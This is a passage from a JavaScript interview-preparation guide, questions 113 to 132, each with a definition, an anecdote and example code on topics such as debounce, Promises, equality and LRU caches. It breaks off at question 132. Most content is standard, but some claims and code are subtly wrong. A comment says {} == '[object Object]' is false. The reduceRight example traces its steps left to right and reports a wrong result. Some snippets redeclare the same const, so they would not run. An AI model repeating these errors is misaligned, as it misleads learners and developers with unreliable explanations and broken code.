Both check if something is an array, but work differently across contexts. `Array.isArray()` is the reliable method that works across different execution contexts (iframes, different windows). `instanceof Array` can fail across contexts because each context has its own Array constructor. `Array.isArray()` is the recommended way - it's like a universal ID check that works everywhere.

#### Real-World Scenario / Case Study
An iframe communication system used `instanceof Array` to check if data was an array. Arrays passed from the parent window failed the check because they were created with a different Array constructor. Switching to `Array.isArray()` fixed the cross-context communication issues.

#### Example Code
```js
const arr = [1, 2, 3];

// Array.isArray() - recommended:
console.log(Array.isArray(arr));  // true
console.log(Array.isArray({}));   // false
console.log(Array.isArray(null));  // false

// instanceof - can fail across contexts:
console.log(arr instanceof Array);  // true (usually)

// Problem with instanceof across contexts:
// In iframe or different window:
const iframe = document.createElement('iframe');
document.body.appendChild(iframe);
const iframeArray = iframe.contentWindow.Array;

const arr = new iframeArray(1, 2, 3);
console.log(arr instanceof Array);        // false (different Array constructor)
console.log(Array.isArray(arr));          // true (works correctly)

// Other ways (not recommended):
console.log(Object.prototype.toString.call(arr) === '[object Array]');  // Works but verbose
console.log(arr.constructor === Array);  // Can be spoofed
```

---

### Question 114: How do you implement debounce and throttle from scratch?

#### Definition
Debounce waits for a pause before executing - like waiting for someone to stop talking. Throttle limits execution frequency - like only allowing one question per minute. Debounce is "wait until they're done", throttle is "only this many times". Both prevent excessive function calls. Implementing them requires managing timers and function calls.

#### Real-World Scenario / Case Study
A search input was making API calls on every keystroke. Typing "javascript" triggered 10 API calls. Implementing debounce waited 300ms after typing stopped, reducing calls to 1. A scroll handler fired 100+ times per second. Throttling limited it to once per 100ms, fixing performance issues.

#### Example Code
```js
// Debounce implementation:
function debounce(func, delay) {
  let timeoutId;
  
  return function(...args) {
    const context = this;
    
    clearTimeout(timeoutId);
    
    timeoutId = setTimeout(() => {
      func.apply(context, args);
    }, delay);
  };
}

// Usage:
const debouncedSearch = debounce((query) => {
  console.log('Searching:', query);
}, 300);

// User types "javascript":
// - Types 'j' - timer starts (300ms)
// - Types 'a' - timer resets (300ms)
// - Types 'v' - timer resets (300ms)
// - ... continues until 300ms pause
// - Then executes once

// Throttle implementation:
function throttle(func, limit) {
  let inThrottle;
  let lastResult;
  
  return function(...args) {
    const context = this;
    
    if (!inThrottle) {
      lastResult = func.apply(context, args);
      inThrottle = true;
      
      setTimeout(() => {
        inThrottle = false;
      }, limit);
    }
    
    return lastResult;
  };
}

// Usage:
const throttledScroll = throttle(() => {
  console.log('Scrolled');
}, 100);

// Scroll events:
// - Event 1 (0ms) - executes
// - Event 2 (50ms) - ignored
// - Event 3 (100ms) - ignored
// - Event 4 (150ms) - executes (100ms passed)

// Throttle with leading and trailing:
function throttle(func, limit, options = {}) {
  let timeoutId;
  let lastExecTime = 0;
  
  return function(...args) {
    const context = this;
    const now = Date.now();
    
    if (!lastExecTime && options.leading !== false) {
      // Execute immediately on first call
      func.apply(context, args);
      lastExecTime = now;
    } else {
      clearTimeout(timeoutId);
      
      timeoutId = setTimeout(() => {
        if (options.trailing !== false) {
          func.apply(context, args);
        }
        lastExecTime = options.leading === false ? 0 : Date.now();
      }, limit - (now - lastExecTime));
    }
  };
}
```

---

### Question 115: What is the difference between `JSON.stringify` and `JSON.parse`?

#### Definition
`JSON.stringify` converts JavaScript objects to JSON strings - like translating your language to a universal format for storage or transmission. `JSON.parse` converts JSON strings back to JavaScript objects - like translating back to your language. `stringify` is for sending/saving data, `parse` is for receiving/loading data. Both handle the conversion between JavaScript and JSON format.

#### Real-World Scenario / Case Study
An API was sending JavaScript objects directly, which worked in some cases but failed when objects contained functions or circular references. Using `JSON.stringify` before sending ensured only serializable data was sent. On the receiving end, `JSON.parse` converted strings back to objects. This fixed data transmission issues.

#### Example Code
```js
const obj = {
  name: 'John',
  age: 30,
  active: true,
  data: null,
  hobbies: ['reading', 'coding']
};

// JSON.stringify - object to string:
const jsonString = JSON.stringify(obj);
console.log(jsonString);
// '{"name":"John","age":30,"active":true,"data":null,"hobbies":["reading","coding"]}'

// JSON.parse - string to object:
const parsed = JSON.parse(jsonString);
console.log(parsed.name);  // 'John'

// What gets lost in stringify:
const obj2 = {
  func: function() {},      // Functions removed
  undefined: undefined,     // Undefined removed
  symbol: Symbol('test'),   // Symbols removed
  date: new Date()          // Dates become strings
};

JSON.stringify(obj2);
// '{"date":"2023-10-15T12:00:00.000Z"}'

// Custom replacer:
JSON.stringify(obj, (key, value) => {
  if (key === 'age') {
    return value + 10;  // Modify during stringify
  }
  return value;
});

// Custom reviver:
JSON.parse(jsonString, (key, value) => {
  if (key === 'age') {
    return value - 10;  // Modify during parse
  }
  return value;
});

// Circular reference error:
const circular = { a: 1 };
circular.self = circular;
JSON.stringify(circular);  // Error: Converting circular structure
```

---

### Question 116: How do you implement a deep equality check?

#### Definition
Deep equality checks if two objects have the same structure and values at all levels, not just the same reference. `===` only checks if they're the same object in memory. Deep equality recursively compares all properties and nested objects. It's like comparing two houses room by room, not just checking if they're the same address.

#### Real-World Scenario / Case Study
A state management system needed to detect if state actually changed. Using `===` always returned false for new objects, even with same values. Implementing deep equality allowed detecting real changes vs. object recreation. This prevented unnecessary re-renders and improved performance.

#### Example Code
```js
// Shallow equality (only checks top level):
function shallowEqual(obj1, obj2) {
  if (obj1 === obj2) return true;
  if (typeof obj1 !== 'object' || obj1 === null) return false;
  if (typeof obj2 !== 'object' || obj2 === null) return false;
  
  const keys1 = Object.keys(obj1);
  const keys2 = Object.keys(obj2);
  
  if (keys1.length !== keys2.length) return false;
  
  for (let key of keys1) {
    if (obj1[key] !== obj2[key]) return false;
  }
  
  return true;
}

// Deep equality:
function deepEqual(obj1, obj2) {
  if (obj1 === obj2) return true;
  
  if (obj1 == null || obj2 == null) return false;
  if (typeof obj1 !== 'object' || typeof obj2 !== 'object') return false;
  
  if (Array.isArray(obj1) !== Array.isArray(obj2)) return false;
  
  const keys1 = Object.keys(obj1);
  const keys2 = Object.keys(obj2);
  
  if (keys1.length !== keys2.length) return false;
  
  for (let key of keys1) {
    if (!keys2.includes(key)) return false;
    if (!deepEqual(obj1[key], obj2[key])) return false;
  }
  
  return true;
}

// Usage:
const obj1 = { a: 1, b: { c: 2 } };
const obj2 = { a: 1, b: { c: 2 } };
const obj3 = { a: 1, b: { c: 3 } };

console.log(obj1 === obj2);        // false (different references)
console.log(deepEqual(obj1, obj2)); // true (same structure and values)
console.log(deepEqual(obj1, obj3)); // false (different values)

// Handling edge cases:
function deepEqual(obj1, obj2, visited = new WeakMap()) {
  if (obj1 === obj2) return true;
  
  // Handle circular references:
  if (visited.has(obj1) && visited.get(obj1) === obj2) return true;
  visited.set(obj1, obj2);
  
  if (obj1 == null || obj2 == null) return obj1 === obj2;
  if (typeof obj1 !== 'object' || typeof obj2 !== 'object') return obj1 === obj2;
  
  // Handle Date:
  if (obj1 instanceof Date && obj2 instanceof Date) {
    return obj1.getTime() === obj2.getTime();
  }
  
  // Handle RegExp:
  if (obj1 instanceof RegExp && obj2 instanceof RegExp) {
    return obj1.toString() === obj2.toString();
  }
  
  // Continue with object comparison...
}
```

---

### Question 117: What is the difference between `Object.keys()`, `Object.values()`, and `Object.entries()`?

#### Definition
These methods extract different parts of objects. `Object.keys()` gets property names (keys) - like getting all the labels. `Object.values()` gets property values - like getting all the contents. `Object.entries()` gets both as [key, value] pairs - like getting labels with their contents together. Each returns an array you can iterate over.

#### Real-World Scenario / Case Study
Code was manually iterating objects with `for...in` and checking `hasOwnProperty`, which was verbose and error-prone. Using `Object.keys()` or `Object.entries()` made the code cleaner and more readable. `Object.entries()` was particularly useful for converting objects to arrays for filtering/mapping.

#### Example Code
```js
const obj = { a: 1, b: 2, c: 3 };

// Object.keys() - get property names:
const keys = Object.keys(obj);
console.log(keys);  // ['a', 'b', 'c']

// Object.values() - get property values:
const values = Object.values(obj);
console.log(values);  // [1, 2, 3]

// Object.entries() - get [key, value] pairs:
const entries = Object.entries(obj);
console.log(entries);  // [['a', 1], ['b', 2], ['c', 3]]

// Use cases:

// Iterate over keys:
Object.keys(obj).forEach(key => {
  console.log(key, obj[key]);
});

// Iterate over values:
Object.values(obj).forEach(value => {
  console.log(value);
});

// Iterate over entries:
Object.entries(obj).forEach(([key, value]) => {
  console.log(key, value);
});

// Convert object to array for array methods:
const filtered = Object.entries(obj)
  .filter(([key, value]) => value > 1)
  .reduce((acc, [key, value]) => {
    acc[key] = value;
    return acc;
  }, {});
// { b: 2, c: 3 }

// Convert array back to object:
const newObj = Object.fromEntries([
  ['a', 1],
  ['b', 2]
]);
// { a: 1, b: 2 }
```

---

### Question 118: How do you implement a Promise from scratch?

#### Definition
A Promise is an object representing an eventual completion (or failure) of an async operation. Implementing one requires: storing state (pending/fulfilled/rejected), storing result/error, managing callbacks (then/catch handlers), and handling chaining. It's like a contract that says "I'll call you when I'm done, and you can chain more work after."

#### Real-World Scenario / Case Study
A team needed to understand how Promises work internally. Implementing a basic Promise from scratch helped them understand the event loop, microtasks, and async patterns. This knowledge helped them debug Promise-related issues and write better async code.

#### Example Code
```js
// Basic Promise implementation:
class MyPromise {
  constructor(executor) {
    this.state = 'pending';
    this.value = undefined;
    this.reason = undefined;
    this.onFulfilledCallbacks = [];
    this.onRejectedCallbacks = [];
    
    const resolve = (value) => {
      if (this.state === 'pending') {
        this.state = 'fulfilled';
        this.value = value;
        this.onFulfilledCallbacks.forEach(cb => cb(value));
      }
    };
    
    const reject = (reason) => {
      if (this.state === 'pending') {
        this.state = 'rejected';
        this.reason = reason;
        this.onRejectedCallbacks.forEach(cb => cb(reason));
      }
    };
    
    try {
      executor(resolve, reject);
    } catch (error) {
      reject(error);
    }
  }
  
  then(onFulfilled, onRejected) {
    return new MyPromise((resolve, reject) => {
      if (this.state === 'fulfilled') {
        try {
          const result = onFulfilled ? onFulfilled(this.value) : this.value;
          resolve(result);
        } catch (error) {
          reject(error);
        }
      } else if (this.state === 'rejected') {
        try {
          const result = onRejected ? onRejected(this.reason) : this.reason;
          resolve(result);
        } catch (error) {
          reject(error);
        }
      } else {
        // Pending - store callbacks
        this.onFulfilledCallbacks.push((value) => {
          try {
            const result = onFulfilled ? onFulfilled(value) : value;
            resolve(result);
          } catch (error) {
            reject(error);
          }
        });
        
        this.onRejectedCallbacks.push((reason) => {
          try {
            const result = onRejected ? onRejected(reason) : reason;
            resolve(result);
          } catch (error) {
            reject(error);
          }
        });
      }
    });
  }
  
  catch(onRejected) {
    return this.then(null, onRejected);
  }
  
  static resolve(value) {
    return new MyPromise(resolve => resolve(value));
  }
  
  static reject(reason) {
    return new MyPromise((resolve, reject) => reject(reason));
  }
}

// Usage:
const promise = new MyPromise((resolve, reject) => {
  setTimeout(() => resolve('Success'), 1000);
});

promise.then(value => {
  console.log(value);  // 'Success' after 1 second
  return 'Next value';
}).then(value => {
  console.log(value);  // 'Next value'
});
```

---

### Question 119: What is the difference between `setTimeout` and `setInterval`?

#### Definition
`setTimeout` runs code once after a delay - like setting an alarm for one time. `setInterval` runs code repeatedly at intervals - like a recurring alarm. Both return IDs you can use to cancel them with `clearTimeout`/`clearInterval`. `setTimeout` is for one-time delays, `setInterval` is for repeating tasks. Be careful with `setInterval` - if code takes longer than the interval, executions can overlap.

#### Real-World Scenario / Case Study
A polling system used `setInterval` to check for updates every 5 seconds. When the API was slow (taking 10 seconds), multiple requests overlapped, causing race conditions and duplicate updates. Switching to recursive `setTimeout` ensured the next poll only started after the previous one finished, fixing the overlap issue.

#### Example Code
```js
// setTimeout - runs once:
const timeoutId = setTimeout(() => {
  console.log('This runs once after 1 second');
}, 1000);

clearTimeout(timeoutId);  // Cancel if needed

// setInterval - runs repeatedly:
const intervalId = setInterval(() => {
  console.log('This runs every 1 second');
}, 1000);

clearInterval(intervalId);  // Stop the interval

// Problem with setInterval - overlapping executions:
setInterval(() => {
  // If this takes 2 seconds but interval is 1 second:
  fetchData();  // Can overlap with next execution
}, 1000);

// Fix - recursive setTimeout:
function poll() {
  fetchData().then(() => {
    setTimeout(poll, 1000);  // Only start next after current finishes
  });
}
poll();

// Or with async/await:
async function poll() {
  while (true) {
    await fetchData();
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
}
```

---

### Question 120: How do you implement a binary search algorithm?

#### Definition
Binary search finds an item in a sorted array by repeatedly dividing the search space in half. It compares the target with the middle element, then searches either the left or right half. It's like finding a word in a dictionary - you don't start at page 1, you open to the middle and go left or right. Much faster than linear search for large arrays - O(log n) vs O(n).

#### Real-World Scenario / Case Study
A search feature was using linear search through 100,000 sorted items, taking 100ms per search. Implementing binary search reduced search time to under 1ms. Users noticed the instant search results, significantly improving the user experience.

#### Example Code
```js
// Binary search - iterative:
function binarySearch(arr, target) {
  let left = 0;
  let right = arr.length - 1;
  
  while (left <= right) {
    const mid = Math.floor((left + right) / 2);
    
    if (arr[mid] === target) {
      return mid;  // Found
    } else if (arr[mid] < target) {
      left = mid + 1;  // Search right half
    } else {
      right = mid - 1;  // Search left half
    }
  }
  
  return -1;  // Not found
}

// Binary search - recursive:
function binarySearchRecursive(arr, target, left = 0, right = arr.length - 1) {
  if (left > right) return -1;
  
  const mid = Math.floor((left + right) / 2);
  
  if (arr[mid] === target) {
    return mid;
  } else if (arr[mid] < target) {
    return binarySearchRecursive(arr, target, mid + 1, right);
  } else {
    return binarySearchRecursive(arr, target, left, mid - 1);
  }
}

// Usage:
const sortedArray = [1, 3, 5, 7, 9, 11, 13, 15];
console.log(binarySearch(sortedArray, 7));  // 3
console.log(binarySearch(sortedArray, 8));  // -1

// Finding insertion point:
function findInsertionPoint(arr, target) {
  let left = 0;
  let right = arr.length;
  
  while (left < right) {
    const mid = Math.floor((left + right) / 2);
    if (arr[mid] < target) {
      left = mid + 1;
    } else {
      right = mid;
    }
  }
  
  return left;  // Where to insert
}
```

---

## More Interview Questions (121-500+)

### Question 121: How do you implement a LRU (Least Recently Used) cache?

#### Definition
LRU cache keeps the most recently used items and removes the least recently used when full. It's like a closet with limited space - when full, you remove clothes you haven't worn in the longest time. Useful for caching with size limits. Implementation typically uses a Map for O(1) access and a doubly-linked list to track usage order.

#### Real-World Scenario / Case Study
An API was caching all responses in memory, causing out-of-memory errors after hours of operation. Implementing an LRU cache with a 1000-item limit automatically evicted old entries. Memory usage stayed constant, and frequently accessed data remained cached, improving performance.

#### Example Code
```js
class LRUCache {
  constructor(capacity) {
    this.capacity = capacity;
    this.cache = new Map();
  }
  
  get(key) {
    if (!this.cache.has(key)) return -1;
    
    // Move to end (most recently used):
    const value = this.cache.get(key);
    this.cache.delete(key);
    this.cache.set(key, value);
    
    return value;
  }
  
  put(key, value) {
    if (this.cache.has(key)) {
      // Update existing
      this.cache.delete(key);
    } else if (this.cache.size >= this.capacity) {
      // Remove least recently used (first item):
      const firstKey = this.cache.keys().next().value;
      this.cache.delete(firstKey);
    }
    
    this.cache.set(key, value);
  }
}

// Usage:
const cache = new LRUCache(2);
cache.put(1, 'a');
cache.put(2, 'b');
cache.get(1);      // 'a'
cache.put(3, 'c'); // Evicts key 2
cache.get(2);      // -1 (not found)
```

---

### Question 122: What is the difference between `Array.prototype.map()` and `Array.prototype.forEach()`?

#### Definition
`map` creates a new array with transformed elements - like taking a list and creating a new list where each item is changed. `forEach` just iterates and doesn't return anything - like going through a list and doing something with each item, but not creating a new list. Use `map` when you need a new array, `forEach` when you just need to do something with each element.

#### Real-World Scenario / Case Study
Code was using `forEach` to transform arrays, then manually pushing to a new array. This was verbose and error-prone. Switching to `map` made the code cleaner and more functional. The team also realized `map` was more testable since it returned values instead of relying on side effects.

#### Example Code
```js
const numbers = [1, 2, 3, 4];

// map - returns new array:
const doubled = numbers.map(n => n * 2);
console.log(doubled);  // [2, 4, 6, 8]
console.log(numbers);   // [1, 2, 3, 4] - original unchanged

// forEach - returns undefined:
const result = numbers.forEach(n => console.log(n * 2));
console.log(result);  // undefined

// forEach with side effects:
const doubled = [];
numbers.forEach(n => {
  doubled.push(n * 2);  // Manual array building
});
// map is cleaner for this

// When to use which:
// Use map when:
const names = users.map(user => user.name);  // Need new array

// Use forEach when:
users.forEach(user => {
  sendEmail(user.email);  // Side effects, don't need return value
});
```

---

### Question 123: How do you handle race conditions in JavaScript?

#### Definition
Race conditions happen when multiple async operations complete in unpredictable order, causing bugs. Like two people trying to book the last hotel room - whoever finishes first wins, but the result is unpredictable. Solutions include: sequential execution, locking mechanisms, or using atomic operations. In JavaScript, this often happens with multiple API calls or state updates.

#### Real-World Scenario / Case Study
A form submission was sending duplicate requests when users double-clicked. Both requests completed, creating duplicate records. Implementing request deduplication and disabling the button during submission prevented race conditions. The system now handles rapid clicks correctly.

#### Example Code
```js
// Race condition - multiple async operations:
let balance = 100;

async function withdraw(amount) {
  const current = await getBalance();  // Both read 100
  if (current >= amount) {
    await updateBalance(current - amount);  // Both try to update
  }
}

// Two withdrawals happen simultaneously:
withdraw(50);  // Reads 100, updates to 50
withdraw(50);  // Reads 100, updates to 50 (should be 0!)
// Result: balance is 50 instead of 0

// Fix 1 - sequential execution:
let isProcessing = false;

async function withdraw(amount) {
  if (isProcessing) {
    throw new Error('Transaction in progress');
  }
  
  isProcessing = true;
  try {
    const current = await getBalance();
    if (current >= amount) {
      await updateBalance(current - amount);
    }
  } finally {
    isProcessing = false;
  }
}

// Fix 2 - request deduplication:
const pendingRequests = new Map();

async function fetchUserData(userId) {
  if (pendingRequests.has(userId)) {
    return pendingRequests.get(userId);  // Return existing request
  }
  
  const promise = fetch(`/api/users/${userId}`).then(r => r.json());
  pendingRequests.set(userId, promise);
  
  try {
    const result = await promise;
    return result;
  } finally {
    pendingRequests.delete(userId);
  }
}

// Fix 3 - debounce for rapid calls:
const debouncedSave = debounce(async (data) => {
  await saveData(data);
}, 300);
```

---

### Question 124: What is the difference between `==` and `===` in detail?

#### Definition
`==` does type coercion - it converts types to make comparison work. `===` is strict - both value and type must match exactly. `==` can have surprising results due to coercion rules. `===` is predictable and generally safer. It's like `==` is a flexible friend who tries to make things work, `===` is strict and says "exactly the same or not at all."

#### Real-World Scenario / Case Study
A security check used `==` to compare user IDs. An attacker discovered `"0" == 0` is true, so passing the string "0" granted access to user ID 0. This was a critical security vulnerability. Using `===` prevented the attack by requiring exact type and value match.

#### Example Code
```js
// == does type coercion:
console.log(5 == "5");        // true (string converted to number)
console.log(0 == false);      // true (false converted to 0)
console.log("" == false);     // true (both converted)
console.log(null == undefined); // true (special case)
console.log([] == false);     // true (array converted to number)

// === is strict:
console.log(5 === "5");       // false (different types)
console.log(0 === false);     // false (different types)
console.log("" === false);    // false (different types)
console.log(null === undefined); // false (different types)
console.log([] === false);    // false (different types)

// Coercion rules for ==:
// 1. If types same, use ===
// 2. If null or undefined, return true only if both are null/undefined
// 3. If number and string, convert string to number
// 4. If boolean, convert to number (true=1, false=0)
// 5. If object, convert to primitive (valueOf/toString)

// Surprising results:
console.log([] == ![]);       // true (confusing!)
console.log([1,2] == "1,2"); // true
console.log({} == "[object Object]"); // false (object doesn't convert)

// Best practice - always use ===:
function checkAccess(userId, requestedId) {
  return userId === requestedId;  // Safe
  // return userId == requestedId;  // Unsafe
}
```

---

### Question 125: How do you implement a Pub-Sub pattern?

#### Definition
Pub-Sub (Publish-Subscribe) lets components communicate without knowing about each other. Publishers send messages to channels, subscribers listen to channels. It's like a radio system - broadcasters publish on frequencies, listeners tune in. Components are decoupled - they don't need direct references to each other.

#### Real-World Scenario / Case Study
A complex UI had tightly coupled components. Changing one required updating many others. Implementing Pub-Sub allowed components to communicate through events. Adding new features became easier - components just subscribed to relevant events without modifying existing code.

#### Example Code
```js
class PubSub {
  constructor() {
    this.subscribers = {};
  }
  
  subscribe(channel, callback) {
    if (!this.subscribers[channel]) {
      this.subscribers[channel] = [];
    }
    this.subscribers[channel].push(callback);
    
    // Return unsubscribe function:
    return () => {
      this.unsubscribe(channel, callback);
    };
  }
  
  unsubscribe(channel, callback) {
    if (this.subscribers[channel]) {
      this.subscribers[channel] = this.subscribers[channel].filter(
        cb => cb !== callback
      );
    }
  }
  
  publish(channel, data) {
    if (this.subscribers[channel]) {
      this.subscribers[channel].forEach(callback => {
        callback(data);
      });
    }
  }
}

// Usage:
const pubsub = new PubSub();

// Subscribers:
const unsubscribe1 = pubsub.subscribe('userLogin', (user) => {
  console.log('User logged in:', user);
});

pubsub.subscribe('userLogin', (user) => {
  updateUI(user);
});

// Publisher:
pubsub.publish('userLogin', { id: 1, name: 'John' });
// Both subscribers notified

// Unsubscribe:
unsubscribe1();
```

---

### Question 126: How do you implement function overloading in JavaScript?

#### Definition
JavaScript doesn't have true function overloading (multiple functions with same name, different parameters). Instead, you check arguments inside one function and behave differently based on what's passed. It's like a smart assistant who adapts based on what you ask for - same person, different responses. You can check argument count, types, or use default parameters.

#### Real-World Scenario / Case Study
A utility library needed functions that worked with different argument types. Without overloading, developers created separate functions with different names, causing confusion. Implementing argument-based branching in single functions made the API cleaner and more intuitive, like native JavaScript methods.

#### Example Code
```js
// Function overloading by argument count:
function greet(name, age) {
  if (arguments.length === 1) {
    return `Hello, ${name}!`;
  } else if (arguments.length === 2) {
    return `Hello, ${name}! You are ${age} years old.`;
  }
}

greet('John');        // "Hello, John!"
greet('John', 30);    // "Hello, John! You are 30 years old."

// By argument types:
function process(data) {
  if (typeof data === 'string') {
    return data.toUpperCase();
  } else if (Array.isArray(data)) {
    return data.join(', ');
  } else if (typeof data === 'object') {
    return JSON.stringify(data);
  }
}

// Using default parameters (ES6):
function createUser(name, email = null, age = null) {
  const user = { name };
  if (email) user.email = email;
  if (age) user.age = age;
  return user;
}

// Advanced - using rest parameters:
function sum(...args) {
  if (args.length === 1 && Array.isArray(args[0])) {
    return args[0].reduce((a, b) => a + b, 0);
  }
  return args.reduce((a, b) => a + b, 0);
}

sum(1, 2, 3);        // 6
sum([1, 2, 3]);      // 6
```

---

### Question 127: What is the difference between `Array.prototype.filter()` and `Array.prototype.find()`?

#### Definition
`filter` returns all elements that match a condition - like finding all red items in a box. `find` returns the first element that matches - like finding the first red item and stopping. `filter` always returns an array (even if empty), `find` returns the element or `undefined`. Use `filter` when you need multiple matches, `find` when you need just one.

#### Real-World Scenario / Case Study
Code was using `filter()[0]` to find a single user, which was inefficient - it filtered all users then took the first. Switching to `find()` stopped at the first match, improving performance. The code also became clearer about intent - finding one vs filtering many.

#### Example Code
```js
const users = [
  { id: 1, name: 'John', active: true },
  { id: 2, name: 'Jane', active: false },
  { id: 3, name: 'Bob', active: true }
];

// filter - returns array of all matches:
const activeUsers = users.filter(user => user.active);
console.log(activeUsers);  
// [{ id: 1, name: 'John', active: true }, { id: 3, name: 'Bob', active: true }]

// find - returns first match or undefined:
const firstActive = users.find(user => user.active);
console.log(firstActive);  
// { id: 1, name: 'John', active: true }

// No matches:
const noMatch = users.find(user => user.id === 999);
console.log(noMatch);  // undefined

const noMatches = users.filter(user => user.id === 999);
console.log(noMatches);  // [] (empty array)

// Performance difference:
// filter - checks ALL elements
const all = largeArray.filter(x => x > 100);  // Processes entire array

// find - stops at first match
const first = largeArray.find(x => x > 100);  // Stops when found
```

---

### Question 128: How do you implement a retry mechanism for failed API calls?

#### Definition
Retry mechanism automatically tries failed operations again, usually with delays between attempts. It's like knocking on a door - if no answer, wait a bit and try again. Useful for transient failures (network issues, temporary server errors). Common patterns: exponential backoff (wait longer each time), max retries, and jitter (random delay to prevent thundering herd).

#### Real-World Scenario / Case Study
An app was failing when APIs had temporary network issues. Users had to manually retry, causing frustration. Implementing automatic retry with exponential backoff handled transient failures gracefully. 90% of temporary failures were resolved by retries, significantly improving user experience.

#### Example Code
```js
// Basic retry:
async function retry(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
    }
  }
}

// Exponential backoff:
async function retryWithBackoff(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      
      // Exponential backoff: 1s, 2s, 4s, 8s...
      const delay = Math.pow(2, i) * 1000;
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  }
}

// With jitter (random delay to prevent thundering herd):
async function retryWithJitter(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      
      const baseDelay = Math.pow(2, i) * 1000;
      const jitter = Math.random() * 1000;  // Random 0-1s
      await new Promise(resolve => setTimeout(resolve, baseDelay + jitter));
    }
  }
}

// Retry only for specific errors:
async function retryOnNetworkError(fn, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await fn();
    } catch (error) {
      // Only retry network errors, not 4xx errors:
      if (error.status >= 400 && error.status < 500) {
        throw error;  // Don't retry client errors
      }
      
      if (i === maxRetries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
    }
  }
}

// Usage:
const result = await retryWithBackoff(() => 
  fetch('/api/data').then(r => r.json())
);
```

---

### Question 129: What is the difference between `Array.prototype.some()` and `Array.prototype.every()`?

#### Definition
`some` returns true if at least one element passes the test - like "is anyone here?" `every` returns true only if all elements pass - like "is everyone here?" Both short-circuit (stop early). `some` stops at first truthy, `every` stops at first falsy. Use `some` to check if any match, `every` to check if all match.

#### Real-World Scenario / Case Study
Code was using `filter().length > 0` to check if any users were active, which processed all elements. Using `some()` stopped at the first active user, improving performance. Similarly, `every()` was more efficient than `filter().length === array.length` for checking if all users were active.

#### Example Code
```js
const users = [
  { name: 'John', active: true },
  { name: 'Jane', active: false },
  { name: 'Bob', active: true }
];

// some - returns true if ANY element passes:
const hasActive = users.some(user => user.active);
console.log(hasActive);  // true (John is active)

// every - returns true if ALL elements pass:
const allActive = users.every(user => user.active);
console.log(allActive);  // false (Jane is not active)

// Short-circuiting:
const numbers = [2, 4, 6, 7, 8];

// some stops at first truthy:
numbers.some(n => {
  console.log('Checking:', n);
  return n % 2 === 1;  // Stops at 7
});
// Logs: Checking: 2, Checking: 4, Checking: 6, Checking: 7

// every stops at first falsy:
numbers.every(n => {
  console.log('Checking:', n);
  return n % 2 === 0;  // Stops at 7
});
// Logs: Checking: 2, Checking: 4, Checking: 6, Checking: 7

// Common patterns:
// Check if array has any truthy values:
if (array.some(Boolean)) { }

// Check if all values are truthy:
if (array.every(Boolean)) { }
```

---

### Question 130: How do you implement a timeout for promises?

#### Definition
Promise timeout means canceling a promise if it takes too long - like setting a maximum wait time. If the promise doesn't resolve/reject within the timeout, you reject with a timeout error. Useful for preventing hanging requests. Implementation uses `Promise.race()` between the actual promise and a timeout promise.

#### Real-World Scenario / Case Study
API calls were hanging indefinitely when servers were down, causing the UI to freeze waiting for responses. Implementing timeouts (5 seconds) allowed the app to show error messages and continue functioning. Users got feedback instead of infinite loading spinners.

#### Example Code
```js
// Basic timeout:
function withTimeout(promise, timeoutMs) {
  const timeoutPromise = new Promise((_, reject) => {
    setTimeout(() => {
      reject(new Error('Operation timed out'));
    }, timeoutMs);
  });
  
  return Promise.race([promise, timeoutPromise]);
}

// Usage:
const fetchWithTimeout = withTimeout(
  fetch('/api/data'),
  5000  // 5 second timeout
);

try {
  const response = await fetchWithTimeout;
} catch (error) {
  if (error.message === 'Operation timed out') {
    console.log('Request took too long');
  }
}

// Using AbortController (better for fetch):
function fetchWithTimeout(url, timeoutMs = 5000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeoutMs);
  
  return fetch(url, { signal: controller.signal })
    .finally(() => clearTimeout(timeoutId));
}

// Timeout with cleanup:
function withTimeout(promise, timeoutMs, onTimeout) {
  let timeoutId;
  
  const timeoutPromise = new Promise((_, reject) => {
    timeoutId = setTimeout(() => {
      if (onTimeout) onTimeout();
      reject(new Error('Timeout'));
    }, timeoutMs);
  });
  
  return Promise.race([
    promise.finally(() => clearTimeout(timeoutId)),
    timeoutPromise
  ]);
}

// Retry with timeout:
async function fetchWithRetryAndTimeout(url, maxRetries = 3, timeout = 5000) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await withTimeout(fetch(url), timeout);
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}
```

---

### Question 131: What is the difference between `Array.prototype.reduce()` and `Array.prototype.reduceRight()`?

#### Definition
Both combine array elements into a single value, but `reduce` goes left-to-right (start to end) while `reduceRight` goes right-to-left (end to start). It's like reading a book forward vs backward. `reduceRight` is useful when order matters, like processing operations that need to happen in reverse order.

#### Real-World Scenario / Case Study
A calculator was processing operations left-to-right, but needed right-to-left for correct mathematical precedence. Using `reduceRight` allowed processing operations in the correct order, fixing calculation bugs. The code became clearer about the processing direction.

#### Example Code
```js
const numbers = [1, 2, 3, 4];

// reduce - left to right:
const sum = numbers.reduce((acc, val) => acc + val, 0);
// 0 + 1 = 1, 1 + 2 = 3, 3 + 3 = 6, 6 + 4 = 10

// reduceRight - right to left:
const sumRight = numbers.reduceRight((acc, val) => acc + val, 0);
// 0 + 4 = 4, 4 + 3 = 7, 7 + 2 = 9, 9 + 1 = 10

// When order matters:
const operations = [
  { type: 'divide', value: 2 },
  { type: 'multiply', value: 3 },
  { type: 'add', value: 5 }
];

// Process right to left (like math):
const result = operations.reduceRight((acc, op) => {
  switch (op.type) {
    case 'add': return acc + op.value;
    case 'multiply': return acc * op.value;
    case 'divide': return acc / op.value;
  }
}, 10);
// 10 / 2 = 5, 5 * 3 = 15, 15 + 5 = 20
```

---

### Question 132: How do you implement a circular buffer/ring buffer?

#### Definition
